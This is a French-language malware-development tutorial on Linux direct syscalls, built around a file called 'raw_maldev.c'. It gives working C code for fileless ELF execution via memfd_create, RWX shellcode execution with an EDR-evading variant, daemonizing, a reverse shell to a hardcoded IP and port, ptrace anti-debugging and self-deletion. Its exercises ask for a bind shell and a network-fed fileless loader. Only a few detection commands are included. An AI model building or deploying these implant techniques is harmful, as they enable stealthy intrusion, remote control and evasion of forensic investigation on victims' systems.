# Syscalls Linux - Appels système directs

## Objectif
Comprendre comment bypasser la libc pour appeler directement le kernel Linux. Technique utilisée par BPFDoor, TeamTNT, et la plupart des implants Linux modernes.

## Prérequis
- Assembleur x86_64 (registres, instructions de base)
- Notion de kernel vs userspace
- Compilation C sur Linux

---

## Théorie

### Pourquoi des syscalls directs ?

**Chemin normal :**
```
Programme → libc (glibc) → syscall → Kernel
```

**Chemin direct :**
```
Programme → syscall → Kernel
```

**Avantages pour le maldev :**
1. **Pas de dépendance libc** : Binaire plus petit, fonctionne partout
2. **Évasion** : Hooks sur libc (LD_PRELOAD, ptrace) ne voient rien
3. **Fileless exec** : `memfd_create` sans traces disque
4. **Anti-forensics** : Moins de symbols, plus dur à analyser

### Convention d'appel syscall x86_64

| Registre | Usage |
|----------|-------|
| `rax` | Numéro du syscall |
| `rdi` | Argument 1 |
| `rsi` | Argument 2 |
| `rdx` | Argument 3 |
| `r10` | Argument 4 |
| `r8` | Argument 5 |
| `r9` | Argument 6 |
| `rax` | Valeur de retour |

**Registres détruits :** `rcx` et `r11` sont écrasés par l'instruction `syscall`.

---

## Analyse du code `raw_maldev.c`

### Section 1 : Wrapper syscall générique

```c
long sc3(long n, long a, long b, long c)
{
    long r;
    register long r10 __asm__("r10") = c;
    __asm__ volatile("syscall"
        : "=a"(r)                    // output: rax → r
        : "0"(n), "D"(a), "S"(b), "d"(c)  // inputs
        : "rcx","r11","memory");     // clobbered
    return r;
}
```

**Décomposition de l'assembleur inline :**

| Élément | Signification |
|---------|---------------|
| `"=a"(r)` | Output : `rax` va dans la variable `r` |
| `"0"(n)` | Input : `n` dans le même registre que output 0 (rax) |
| `"D"(a)` | Input : `a` dans `rdi` |
| `"S"(b)` | Input : `b` dans `rsi` |
| `"d"(c)` | Input : `c` dans `rdx` |
| `"rcx","r11","memory"` | Ces registres sont modifiés par syscall |

**Pourquoi `volatile` ?** Empêche le compilateur d'optimiser/réordonner l'instruction.

**Note :** Le code a un bug - `r10` est déclaré mais pas utilisé dans les contraintes. Version corrigée :
```c
long sc4(long n, long a, long b, long c, long d)
{
    long r;
    register long r10 __asm__("r10") = d;
    __asm__ volatile("syscall"
        : "=a"(r)
        : "0"(n), "D"(a), "S"(b), "d"(c), "r"(r10)
        : "rcx","r11","memory");
    return r;
}
```

---

### Section 2 : Numéros de syscalls

```c
#define NR_read     0
#define NR_write    1
#define NR_open     2
#define NR_close    3
#define NR_mmap     9
#define NR_mprotect 10
#define NR_socket   41
#define NR_connect  42
#define NR_fork     57
#define NR_execve   59
#define NR_memfd    319
```

**Source officielle :** `/usr/include/asm/unistd_64.h` ou `ausyscall --dump`

**Comment trouver un numéro :**
```bash
grep -r "define.*__NR_memfd" /usr/include/
ausyscall x86_64 memfd_create
```

**Attention :** Les numéros diffèrent entre architectures (x86 vs x86_64 vs ARM).

---

### Section 3 : memfd_create - Exécution fileless

```c
int memfd_exec(unsigned char* elf, unsigned long len, char** av)
{
    // Crée un fichier anonyme en RAM
    int fd = sc2(NR_memfd, (long)"", 1);  // MFD_CLOEXEC
    if(fd < 0) return -1;

    // Écrit le binaire ELF en mémoire
    sc3(NR_write, fd, (long)elf, len);

    // Construit le path /proc/self/fd/X
    char p[32];
    char* s = p;
    char* fmt = "/proc/self/fd/";
    while(*fmt) *s++ = *fmt++;

    // Conversion int → string (sans sprintf)
    int t = fd, d = 1;
    while(t >= 10) { d *= 10; t /= 10; }
    t = fd;
    while(d) { *s++ = '0' + (t/d); t %= d; d /= 10; }
    *s = 0;

    // Exécute le binaire depuis /proc/self/fd/X
    sc3(NR_execve, (long)p, (long)av, 0);
    return -1;
}
```

**Pourquoi c'est puissant :**
1. **Pas de fichier sur disque** : Le binaire n'existe qu'en RAM
2. **Invisible dans /tmp, /var** : Aucune trace filesystem
3. **Difficile à capturer** : Disparaît à la fin du process

**Flag `MFD_CLOEXEC` (1) :** Le fd est fermé automatiquement après `execve`.

**Malwares utilisant cette technique :**
- BPFDoor (backdoor Linux APT)
- TeamTNT (cryptominers)
- Kinsing

**Détection :**
```bash
# Chercher les memfd en cours
ls -la /proc/*/fd/* 2>/dev/null | grep memfd
ls -la /proc/*/exe 2>/dev/null | grep memfd
```

---

### Section 4 : Exécution de shellcode

```c
void sc_exec(unsigned char* sc, unsigned long len)
{
    // Alloue mémoire RWX (Read-Write-Execute)
    void* m = (void*)sc6(NR_mmap,
        0,           // addr: laisser le kernel choisir
        len,         // length
        7,           // prot: PROT_READ|WRITE|EXEC (1|2|4)
        0x22,        // flags: MAP_PRIVATE|ANONYMOUS (0x02|0x20)
        -1,          // fd: pas de fichier
        0);          // offset

    if((long)m < 0) return;

    // Copie le shellcode (sans memcpy)
    unsigned char* d = m;
    unsigned char* s = sc;
    while(len--) *d++ = *s++;

    // Exécute
    ((void(*)())m)();

    // Cleanup
    sc2(NR_munmap, (long)m, len);
}
```

**Valeurs magiques expliquées :**

| Valeur | Signification |
|--------|---------------|
| `7` | `PROT_READ(1) + PROT_WRITE(2) + PROT_EXEC(4)` |
| `0x22` | `MAP_PRIVATE(0x02) + MAP_ANONYMOUS(0x20)` |
| `-1` | Pas de file descriptor (mémoire anonyme) |

**Problème sécurité :** La mémoire RWX est un red flag. Les EDR modernes alertent sur `mmap` avec prot=7.

**Version plus furtive :**
```c
// Alloue RW
void* m = mmap(0, len, 3, 0x22, -1, 0);  // PROT_READ|WRITE
memcpy(m, sc, len);
// Change en RX
mprotect(m, len, 5);  // PROT_READ|EXEC
((void(*)())m)();
```

---

### Section 5 : Double fork (daemonize)

```c
int spawn(char* path, char** av)
{
    long pid = sc0(NR_fork);
    if(pid == 0) {
        // Child 1
        sc0(NR_setsid);      // Nouveau session leader

        long pid2 = sc0(NR_fork);
        if(pid2 > 0) sc1(NR_exit, 0);  // Child 1 meurt

        // Child 2 (petit-fils) continue
        sc1(NR_close, 0);    // Ferme stdin
        sc1(NR_close, 1);    // Ferme stdout
        sc1(NR_close, 2);    // Ferme stderr

        sc3(NR_execve, (long)path, (long)av, 0);
        sc1(NR_exit, 1);
    }
    return pid;
}
```

**Pourquoi double fork ?**

```
Parent (PID 1000)
    └─ Fork 1 → Child 1 (PID 1001) ← devient session leader
                    └─ Fork 2 → Child 2 (PID 1002) ← daemon final
                    └─ Exit immédiat
    └─ Continue normalement
```

1. **`setsid()`** : Détache du terminal, nouveau groupe de session
2. **Second fork** : Le daemon n'est pas session leader → ne peut pas acquérir de terminal
3. **Ferme 0,1,2** : Pas de lien avec le terminal original

**Résultat :** Process orphelin, adopté par init/systemd, invisible dans `ps` du user.

---

### Section 6 : Reverse shell via syscalls

```c
void revsh(unsigned int ip, unsigned short port)
{
    SA sa = {0};
    sa.fam = 2;  // AF_INET
    sa.port = ((port & 0xFF) << 8) | ((port >> 8) & 0xFF);  // htons
    sa.addr = ip;

    int fd = sc3(NR_socket, 2, 1, 0);  // AF_INET, SOCK_STREAM, 0
    if(fd < 0) return;

    if(sc3(NR_connect, fd, (long)&sa, 16) < 0) {
        sc1(NR_close, fd);
        return;
    }

    // Redirige stdin/stdout/stderr vers le socket
    sc2(NR_dup2, fd, 0);
    sc2(NR_dup2, fd, 1);
    sc2(NR_dup2, fd, 2);

    // Lance un shell
    char* av[] = {"/bin/sh", 0};
    sc3(NR_execve, (long)"/bin/sh", (long)av, 0);
}
```

**Conversion htons manuelle :**
```c
// Port 4444 = 0x115C
// Network byte order (big-endian) = 0x5C11
port = ((port & 0xFF) << 8) | ((port >> 8) & 0xFF);
```

**Valeurs socket :**

| Valeur | Constante |
|--------|-----------|
| `2` (fam) | `AF_INET` |
| `1` (type) | `SOCK_STREAM` (TCP) |
| `16` (addrlen) | `sizeof(struct sockaddr_in)` |

**Utilisation :**
```c
// IP 192.168.1.100 = 0x6401A8C0 (little-endian)
// Ou via inet_addr si libc dispo
revsh(0x6401A8C0, 4444);
```

---

### Section 7 : Anti-debug via ptrace

```c
int chk_ptrace(void)
{
    return sc6(NR_ptrace, 0, 0, 0, 0, 0, 0) < 0;  // PTRACE_TRACEME
}
```

**Logique :**
- `PTRACE_TRACEME` (0) : Demande à être tracé par le parent
- Si déjà sous debugger → échec (-1)
- Si pas de debugger → succès (0)

**Contournement :**
```bash
# LD_PRELOAD pour faker ptrace
# ou patch le binaire pour sauter le check
```

---

### Section 8 : Self-delete

```c
void self_del(void)
{
    char p[256];
    // Ouvre /proc/self/exe (lien vers notre binaire)
    // Lit le path réel
    long n = sc3(NR_read,
        sc2(NR_open, (long)"/proc/self/exe", 0),
        (long)p, 255);

    if(n > 0) {
        p[n] = 0;
        sc1(87, (long)p);  // syscall 87 = unlink
    }
}
```

**Note :** Le code a un bug - il lit `/proc/self/exe` mais devrait utiliser `readlink`. Version corrigée :
```c
void self_del(void)
{
    char p[256];
    long n = readlink("/proc/self/exe", p, 255);
    if(n > 0) {
        p[n] = 0;
        unlink(p);
    }
}
```

---

## Références

### Documentation officielle
- [Linux Syscall Table x86_64](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
- [man 2 syscall](https://man7.org/linux/man-pages/man2/syscall.2.html)
- [man 2 memfd_create](https://man7.org/linux/man-pages/man2/memfd_create.2.html)

### Analyse de malwares
- [BPFDoor Analysis - PwC](https://www.pwc.com/gx/en/issues/cybersecurity/cyber-threat-intelligence/bpfdoor.html)
- [TeamTNT Analysis - Trend Micro](https://www.trendmicro.com/en_us/research/21/k/teamtnt-upgrades-its-cryptominer.html)
- [Fileless Linux Malware - AT&T](https://cybersecurity.att.com/blogs/labs-research/shikitega-new-stealthy-malware-targeting-linux)

### Outils
- [ausyscall](https://linux.die.net/man/8/ausyscall) - Lookup syscall numbers
- [strace](https://strace.io/) - Trace syscalls
- [seccomp-tools](https://github.com/david942j/seccomp-tools) - Analyser filtres seccomp

---

## Exercices

### Exercice 1 : Écrire un wrapper syscall
Écris la fonction `sc5` pour les syscalls à 5 arguments (utilise `r8`).

### Exercice 2 : Bind shell
Modifie `revsh()` pour créer un bind shell (écoute sur un port au lieu de se connecter).

Indices :
- Utilise `NR_bind` (49), `NR_listen` (50), `NR_accept` (43)
- `listen(fd, 1)` - backlog de 1

### Exercice 3 : Fileless loader
Écris un loader qui :
1. Télécharge un ELF via socket
2. L'exécute via memfd_create
3. Sans jamais toucher le disque

### Exercice 4 : Détecter memfd
Écris un script bash qui détecte les processus utilisant memfd_create.

---

## Résumé

| Technique | Syscalls utilisés | Évasion |
|-----------|-------------------|---------|
| Fileless exec | memfd_create, write, execve | Pas de fichier disque |
| Shellcode exec | mmap (RWX), munmap | Bypass libc hooks |
| Daemonize | fork, setsid, close | Détache du terminal |
| Reverse shell | socket, connect, dup2, execve | Pas de netcat/bash visible |
| Anti-debug | ptrace | Détecte debuggers |
| Self-delete | unlink | Anti-forensics |
